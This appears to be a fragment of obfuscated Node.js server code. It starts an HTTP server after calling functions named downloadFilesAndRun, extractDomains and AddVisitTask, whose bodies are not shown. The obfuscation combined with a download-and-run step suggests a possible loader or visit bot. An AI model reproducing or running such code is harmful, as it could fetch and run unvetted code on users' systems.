downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x472232){console[_0x5cbb21(0x148)](_0x5cbb21(0x1a9),_0x472232);}}startserver()['catch'](_0x31ad9c=>{const _0x30d0b4=_0x30cd91;console[_0x30d0b4(0x148)](_0x30d0b4(0x13d),_0x31ad9c);}),app[_0x30cd91(0x18c)](PORT,()=>console[_0x30cd91(0x19d)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
